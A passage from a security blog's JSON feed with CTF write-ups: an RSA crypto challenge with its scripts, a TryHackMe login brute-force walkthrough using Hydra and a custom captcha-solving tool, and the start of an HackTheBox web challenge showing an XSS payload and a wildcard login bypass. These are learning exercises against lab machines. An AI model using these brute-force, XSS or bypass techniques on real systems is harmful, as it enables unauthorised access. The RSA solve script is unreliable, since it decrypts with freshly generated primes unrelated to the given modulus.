exponentiation</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">fast_exp</span>(<span class=\"hljs-params\">a, b, n</span>):<br>    output = <span class=\"hljs-number\">1</span><br>    <span class=\"hljs-keyword\">while</span> b &gt; <span class=\"hljs-number\">0</span>:<br>        <span class=\"hljs-keyword\">if</span> b &amp; <span class=\"hljs-number\">1</span>:<br>            output = output * a % n<br>        a = a * a % n<br>        b &gt;&gt;= <span class=\"hljs-number\">1</span> <br>    <span class=\"hljs-keyword\">return</span> output    <br><br><span class=\"hljs-comment\"># Function to check RSA parameters</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">check</span>(<span class=\"hljs-params\">p, q, n</span>):<br>    a_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    b_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    s = fast_exp(p, fast_exp(q, a_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    t = fast_exp(q, fast_exp(p, b_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    result = s + t<br>    <span class=\"hljs-built_in\">print</span>(result)<br><br><span class=\"hljs-comment\"># Function to generate RSA parameters</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">gen_RSA_params</span>(<span class=\"hljs-params\">N, e</span>):<br>    p = getPrime(N)<br>    q = getPrime(N)<br><br>    <span class=\"hljs-keyword\">while</span> GCD(e, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)) &gt; <span class=\"hljs-number\">1</span>:<br>        p = getPrime(N)<br>        q = getPrime(N)<br><br>    n = p * q<br><br>    check(p, q, n) <br>    <span class=\"hljs-keyword\">return</span> (p, q, n)<br><br><span class=\"hljs-comment\"># Generate RSA parameters and encrypt the flag</span><br>p, q, n = gen_RSA_params(KEY_SIZE, RSA_E) <br>m = bytes_to_long(flag)<br>c = <span class=\"hljs-built_in\">pow</span>(m, RSA_E, n)<br><br><span class=\"hljs-comment\"># Print the ciphertext and modulus</span><br><span class=\"hljs-built_in\">print</span>(c)<br><span class=\"hljs-built_in\">print</span>(n)</span></pre>\n<p id=\"7357\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">This script generates random prime numbers <code class=\"cw amp amq amr po b\">p</code> and <code class=\"cw amp amq amr po b\">q</code>, checks some conditions, and then encrypts the flag using RSA. The <code class=\"cw amp amq amr po b\">check</code> function is there to create a side channel but is not relevant to our solution.</p>\n<h1 id=\"2e1d\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">The Output File: output.txt</h1>\n<pre class=\"pd pe pf pg ph pn po pp bo pq ba bj\"><span id=\"d5ba\" class=\"pr nq gr po b bf ps pt l pu pv\" data-selectable-paragraph=\"\">s+t=24986288511406610689718446624210347240800254679541887917496550238025724025245366296475758347972917098615315083893786596239213463034880126152583583770452304<br>c=5926440800047066468184992240057621921188346083131741617482777221394411358243130401052973132050605103035491365016082149869814064434831123043357292949645845605278066636109516907741970960547141266810284132826982396956610111589<br>n=155735289132981544011017189391760271645447983310532929187034314934077442930131653227631280820261488048477635481834924391697025189196282777696908403230429985112108890167443195955327245288626689006734302524489187183667470192109923398146045404320502820234742450852031718895027266342435688387321102862096023537079</span></pre>\n<p id=\"8a85\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">The output file provides the sum of two exponentiations <code class=\"cw amp amq amr po b\">s+t</code>, the ciphertext <code class=\"cw amp amq amr po b\">c</code>, and the modulus <code class=\"cw amp amq amr po b\">n</code>.</p>\n<h1 id=\"f6a5\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">My Solution Script: solve.py</h1>\n<pre class=\"pd pe pf pg ph pn po pp bo pq ba bj\"><span id=\"eb44\" class=\"pr nq gr po b bf ps pt l pu pv\" data-selectable-paragraph=\"\"><span class=\"hljs-comment\"># Import necessary modules</span><br><span class=\"hljs-keyword\">from</span> Crypto.Util.number <span class=\"hljs-keyword\">import</span> bytes_to_long, long_to_bytes, getPrime, GCD<br><span class=\"hljs-keyword\">import</span> random<br><span class=\"hljs-keyword\">import</span> time<br><br><span class=\"hljs-comment\"># Function for fast modular exponentiation</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">fast_exp</span>(<span class=\"hljs-params\">a, b, n</span>):<br>    output = <span class=\"hljs-number\">1</span><br>    <span class=\"hljs-keyword\">while</span> b &gt; <span class=\"hljs-number\">0</span>:<br>        <span class=\"hljs-keyword\">if</span> b &amp; <span class=\"hljs-number\">1</span>:<br>            output = output * a % n<br>        a = a * a % n<br>        b &gt;&gt;= <span class=\"hljs-number\">1</span> <br>    <span class=\"hljs-keyword\">return</span> output<br><br><span class=\"hljs-comment\"># Function to check RSA parameters (not used in the solution)</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">check</span>(<span class=\"hljs-params\">p, q, n</span>):<br>    a_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    b_ = random.randint(<span class=\"hljs-number\">1</span>, <span class=\"hljs-number\">100</span>)<br>    s = fast_exp(p, fast_exp(q, a_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    t = fast_exp(q, fast_exp(p, b_, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)), n)<br>    result = s + t<br>    <span class=\"hljs-built_in\">print</span>(result)<br><br><span class=\"hljs-comment\"># Function to generate RSA parameters</span><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title.function\">gen_RSA_params</span>(<span class=\"hljs-params\">N, e</span>):<br>    p = getPrime(N)<br>    q = getPrime(N)<br><br>    <span class=\"hljs-keyword\">while</span> GCD(e, (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)) &gt; <span class=\"hljs-number\">1</span>:<br>        p = getPrime(N)<br>        q = getPrime(N)<br><br>    n = p * q<br><br>    check(p, q, n) <br>    <span class=\"hljs-keyword\">return</span> (p, q, n)<br><br><span class=\"hljs-comment\"># Values from the output.txt</span><br>s_plus_t = <span class=\"hljs-number\">24986288511406610689718446624210347240800254679541887917496550238025724025245366296475758347972917098615315083893786596239213463034880126152583583770452304</span><br>c = <span class=\"hljs-number\">5926440800047066468184992240057621921188346083131741617482777221394411358243130401052973132050605103035491365016082149869814064434831123043357292949645845605278066636109516907741970960547141266810284132826982396956610111589</span><br>n = <span class=\"hljs-number\">155735289132981544011017189391760271645447983310532929187034314934077442930131653227631280820261488048477635481834924391697025189196282777696908403230429985112108890167443195955327245288626689006734302524489187183667470192109923398146045404320502820234742450852031718895027266342435688387321102862096023537079</span><br><br><span class=\"hljs-comment\"># Generate RSA parameters</span><br>p, q, n = gen_RSA_params(<span class=\"hljs-number\">512</span>, <span class=\"hljs-number\">3</span>)<br><br><span class=\"hljs-comment\"># Calculate phi(n)</span><br>phi_n = (p - <span class=\"hljs-number\">1</span>) * (q - <span class=\"hljs-number\">1</span>)<br><br><span class=\"hljs-comment\"># Calculate the modular inverse of e (RSA_E) modulo phi_n</span><br>d = <span class=\"hljs-built_in\">pow</span>(<span class=\"hljs-number\">3</span>, -<span class=\"hljs-number\">1</span>, phi<br><br>_n)<br><br><span class=\"hljs-comment\"># Decrypt the ciphertext</span><br>m_decrypted = <span class=\"hljs-built_in\">pow</span>(c, d, n)<br><br><span class=\"hljs-comment\"># Convert the decrypted message from long to bytes</span><br>flag_decrypted = long_to_bytes(m_decrypted)<br><br><span class=\"hljs-comment\"># Print the decrypted flag</span><br><span class=\"hljs-built_in\">print</span>(flag_decrypted.decode(<span class=\"hljs-string\">'utf-8'</span>))</span></pre>\n<h1 id=\"e66d\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">Explanation and Solution</h1>\n<p id=\"d486\" class=\"pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj\" data-selectable-paragraph=\"\">The provided script uses RSA encryption with a small public exponent (<code class=\"cw amp amq amr po b\">e = 3</code>). To solve this challenge, we can use the provided ciphertext (<code class=\"cw amp amq amr po b\">c</code>), modulus (<code class=\"cw amp amq amr po b\">n</code>), and the knowledge that <code class=\"cw amp amq amr po b\">e = 3</code> to decrypt the message.</p>\n<p id=\"a384\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">The <code class=\"cw amp amq amr po b\">solve.py</code> script first generates new RSA parameters (<code class=\"cw amp amq amr po b\">p</code>, <code class=\"cw amp amq amr po b\">q</code>, <code class=\"cw amp amq amr po b\">n</code>) using the <code class=\"cw amp amq amr po b\">gen_RSA_params</code> function. However, the generated values are not used since we already have the correct values from <code class=\"cw amp amq amr po b\">output.txt</code>.</p>\n<p id=\"2344\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">The script then calculates <code class=\"cw amp amq amr po b\">phi(n)</code>, the modular inverse of <code class=\"cw amp amq amr po b\">e</code> (RSA_E) modulo <code class=\"cw amp amq amr po b\">phi(n)</code>, and finally decrypts the ciphertext using modular exponentiation. The decrypted flag is then printed.</p>\n<h1 id=\"a60a\" class=\"np nq gr be nr ns nt nu nv nw nx ny nz oa ob oc od oe of og oh oi oj ok ol om bj\" data-selectable-paragraph=\"\">Conclusion</h1>\n<p id=\"af19\" class=\"pw-post-body-paragraph mr ms gr mt b mu on mw mx my oo na nb nc op ne nf ng oq ni nj nk or nm nn no gk bj\" data-selectable-paragraph=\"\">And there you have it! We successfully decrypted Groot’s message and unveiled the hidden flag. The mini_RSA challenge provided a beginner-friendly introduction to RSA encryption and the importance of securely generating key pairs.</p>\n<p id=\"54a6\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\">Feel free to explore the provided scripts and experiment with different RSA concepts to deepen your understanding of cryptography. Happy hacking, and may the challenges keep coming!</p>\n<p id=\"53aa\" class=\"pw-post-body-paragraph mr ms gr mt b mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no gk bj\" data-selectable-paragraph=\"\"><em class=\"ams\">Written by sakibulalikhan of </em><a class=\"af os\" href=\"https://ctftime.org/team/188318\" rel=\"noopener ugc nofollow\" target=\"_blank\"><em class=\"ams\">HiddenInvestigations</em></a><em class=\"ams\"> for BackdoorCTF 2023.</em></p>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/10/BackdoorCTF-2023-mini_RSA-Challenge-Writeup.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "RSA",
                   "Python",
                   "Crypto",
                   "CTF Writeups",
                   "Backdoorctf 2023"
            ],
            "date_published": "2024-01-07T10:55:56+06:00",
            "date_modified": "2024-01-07T10:55:56+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/capture-tryhackme-writeup.html",
            "title": "Capture TryHackMe Writeup",
            "summary": "SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application&hellip;",
            "content_html": "<div class=\"post__entry\">\n<p id=\"c45e\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly<strong class=\"lk fp\">.</strong></p>\n<p id=\"5273\" class=\"mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj\"><strong>Difficulty = </strong>Easy</p>\n<p id=\"3b4f\" class=\"pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj\"><strong class=\"lk fp\">Challenges: </strong><span class=\"lk fp\">Authentication Bypass, Login Bruteforce, Regex, Custom Python Scripting.</span></p>\n<p id=\"014c\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">TryHackMe Room Link: <a class=\"af nj\" href=\"https://tryhackme.com/room/capture\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://tryhackme.com/room/capture</a></p>\n<p id=\"fb69\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj nk dropcap\" data-selectable-paragraph=\"\"><span class=\"l nl nm nn bn no np nq nr ns eb\">W</span>ell, In Task 1 we got some general information and a task file that contains a list of usernames and a list with passwords.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky nt\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*xlAzpuvtgclCW3WlMwogXg.png\" alt=\"Capture Capture TryHackMe Writeup\" width=\"700\" height=\"379\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"70dd\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Now let’s start the application and load up the main page to see what’s going on.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky nt\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*9Fli7uwoSUcRsXtVkG8Erg.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"178\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"c319\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Loading up the main website <a class=\"af nj\" href=\"http://machine_ip/\" rel=\"noopener ugc nofollow\" target=\"_blank\"><strong class=\"lk fp\">http://MACHINE_IP</strong></a>, we can see an “Intranet login” page.</p>\n<p id=\"0a65\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">With the passwords and usernames list we have it’s safe to assume this will be a brute-force attack.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky od\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*iVc2rJVegHTG4Awrbe5xnA.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"173\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"311d\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">So we’re supposed to beat the self-made rate limiter. Checking the request in Burp doesn’t show any header related to the rate limit. Let’s spin up Hydra.</p>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"9679\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\">sudo hydra -L usernames.txt -P passwords.txt 10.10.22.8 http-post-form <span class=\"hljs-string\">\"/login:username=^USER^&amp;password=^PASS^:Error\"</span> -v -t 40</span></pre>\n<p id=\"4706\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">This returns without any results, I checked the website again and I got a <strong class=\"lk fp\">Captcha Enabled</strong> message showing up with a Captcha to solve.</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky on\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*fVvF-OiskmCOUrlAqlCuCA.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"251\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"2622\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">This captcha is simple to beat. We have to write a Python script that requests the page, solves the captcha, and posts the data with the correct captcha.</p>\n<p id=\"b104\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">To ease your task, I made a full-featured Python tool. you can use that to solve this room. For automation, you can use that. <strong class=\"lk fp\">But strongly recommend that you review my code to understand how the script works.</strong></p>\n<h3 id=\"ea79\" class=\"mg mh fo be mi mj mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd bj\">Exploitation Part:</h3>\n<p id=\"6f74\" class=\"pw-post-body-paragraph li lj fo lk b ll ne ln lo lp nf lr ls lt ng lv lw lx nh lz ma mb ni md me mf fh bj\" data-selectable-paragraph=\"\">Open your <em>terminal</em> and clone this repository to your device.</p>\n<div class=\"oo op oq or os ot\">\n<div class=\"ou ab hm\">\n<div class=\"ov ab cn ca ow ox\">\n<h6 class=\"be fp hj z oy oz pa pb pc pd pe fn bj\"><a href=\"https://github.com/sakibulalikhan/thm-capture\" target=\"_blank\" rel=\"noopener noreferrer\">GitHub Repo Link</a></h6>\n</div>\n</div>\n</div>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"88e7\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sakibulalikhan/thm-capture</span></pre>\n<p id=\"69b9\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Then enter the folder and install the requirements.</p>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"0396\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\"><span class=\"hljs-built_in\">cd</span> thm-capture<br>pip install -r requirements.txt</span></pre>\n<p id=\"48b7\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Now time to exploit! For exploitation, you just use the<em> “-t” flag</em> to specify the target, and after ‘-t’ enter the URL and wait for it to finish the task. This tool also provides you with the flag!!!!!! Are you serious? yes, yes.</p>\n<pre class=\"nu nv nw nx ny oe of og bo oh ba bj\"><span id=\"9fa0\" class=\"oi mh fo of b bf oj ok l ol om\" data-selectable-paragraph=\"\">python capture.py -t <span class=\"hljs-variable\">$IP</span><br><br>Example: python capture.py -t 10.10.22.8</span></pre>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky pn\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*oOJY6QJ9LEuIigHQVLdC5Q.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"592\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"3edd\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\">Isn’t it amazing? You got a <strong>username</strong>, <strong>password</strong>, and <strong>precious flag!!!!!</strong><br>The results are there, but you’ll have to find them yourself!</p>\n<figure class=\"nu nv nw nx ny lf kx ky paragraph-image\">\n<div class=\"nz oa eb ob bg oc\" tabindex=\"0\" role=\"button\">\n<div class=\"kx ky po\">\n<figure class=\"bg lg lh c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*q9mQ7R9azkbCGxsPTcHDAA.png\" alt=\"Capture TryHackMe Writeup\" width=\"700\" height=\"482\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p data-selectable-paragraph=\"\">You can check this links:</p>\n<ul>\n<li><a href=\"https://github.com/sakibulalikhan/thm-capture\">https://github.com/sakibulalikhan/thm-capture</a></li>\n<li><a href=\"https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Authentication_Cheat_Sheet.md#authentication-and-error-messages\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP Authentication Cheat Sheet</a></li>\n<li><a href=\"https://requests.readthedocs.io/en/latest/user/quickstart/\" target=\"_blank\" rel=\"noopener noreferrer\">Quickstart Python Requests</a></li>\n<li><a href=\"https://pythex.org/\">https://pythex.org/</a></li>\n</ul>\n<p id=\"98e4\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\"><strong class=\"lk fp\">Thanks for Reading!!</strong></p>\n<p id=\"cf24\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\"><strong class=\"lk fp\">Follow me on Twitter</strong>: <a class=\"af nj\" href=\"https://twitter.com/sakibulalikhan\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://twitter.com/sakibulalikhan</a></p>\n<p id=\"183c\" class=\"pw-post-body-paragraph li lj fo lk b ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md me mf fh bj\" data-selectable-paragraph=\"\"><strong class=\"lk fp\">Happy Capture~</strong></p>\n</div>",
            "image": "https://sakibulalikhan.pages.dev/media/posts/9/Capture-TryHackMe-Writeup-2.png",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Web Security",
                   "TryHackMe",
                   "Python",
                   "Pentesting",
                   "Offensive Programming",
                   "Hacking Tools",
                   "CTF Writeups"
            ],
            "date_published": "2024-01-07T10:52:32+06:00",
            "date_modified": "2024-01-29T16:26:18+06:00"
        },
        {
            "id": "https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html",
            "url": "https://sakibulalikhan.pages.dev/phonebook-htb-web-challenge-writeup.html",
            "title": "Phonebook — HTB Web Challenge Writeup",
            "summary": "CHALLENGE DESCRIPTION Who is lucky enough to be included in the phonebook? In the beginning, we first visit the web page and got a login&hellip;",
            "content_html": "<div class=\"post__entry\">\n<p id=\"863c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj aom msg--highlight msg--info dropcap\" data-selectable-paragraph=\"\"><span class=\"l aon aoo aop bn aoq aor aos aot aou dj\">C</span>HALLENGE DESCRIPTION</p>\n<p id=\"8ba0\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Who is lucky enough to be included in the phonebook?</p>\n<p id=\"2207\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In the beginning, we first visit the web page and got a login page :))</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aoz\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*JmP-Ml1In7SYMYpTEE_8zw.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"420\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"4369\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">The Web app asks us to log in to the application. But we don’t have any credentials, but we have a text on the homepage where it says<br><code class=\"ff abm abn abo abp b\">New (9.8.2020): You can now login using the workstation username and password! - Reese</code></p>\n<p id=\"abca\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">I take a dummy logging attempt as username: admin &amp;&amp; password: admin. It shows the authentication field::(</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km apa\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*chVw2sr0W9J4ccnpcg4J1g.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"353\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"9d74\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">But if you check the URL then you see there is a parameter :) And we can attempt an XSS attack through it. Is it possible? yes.</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km apb\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*sjyYQXlNohLiT8h-gecV9g.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"290\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"d641\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">After viewing the source code of the webpage, I guess there might be a DOM-based XSS vulnerability. So, let’s try.</p>\n<p id=\"f898\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\"><strong>XSS Payload:</strong></p>\n<pre class=\"yq yr ys yt yu abx abp anr bo ans ba bj\"><span id=\"690e\" class=\"ant zf tu abp b bf anu anv l anw acd\" data-selectable-paragraph=\"\">http://206.189.121.131:30184/login?message=&lt;img src=<span class=\"hljs-string\">'x'</span> onerror=<span class=\"hljs-string\">'alert(1)'</span>&gt;</span></pre>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aod\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*3cBlTfL1VGWggqFV69xnZg.png\" alt=\"Phonebook — HTB Web Challenge Writeup\" width=\"700\" height=\"367\" loading=\"lazy\" data-is-external-image=\"true\" data-is-external-image=\"true\"></figure></figure>\n</div>\n</div>\n</figure>\n<p id=\"d84f\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">Do you see? Here DOM-based XSS worked !!! But alas! this is not the way we can solve the challenge :((</p>\n<p id=\"3a4c\" class=\"pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj\" data-selectable-paragraph=\"\">In the login field, if you use “<strong class=\"ly kz\">*</strong>” for both the username and password field then it automatically bypassed the authentication :)</p>\n<figure class=\"yq yr ys yt yu yv kl km paragraph-image\">\n<div class=\"acf acg dj ach bg aci\" tabindex=\"0\" role=\"button\">\n<div class=\"kl km aod\">\n<figure class=\"bg yx yy c\"><figure class=\"is-loaded\"><img  src=\"https://miro.medium.com/v2/resize:fit:700/1*fd8sbyY2KodIQ4-quvKPYg.png\" 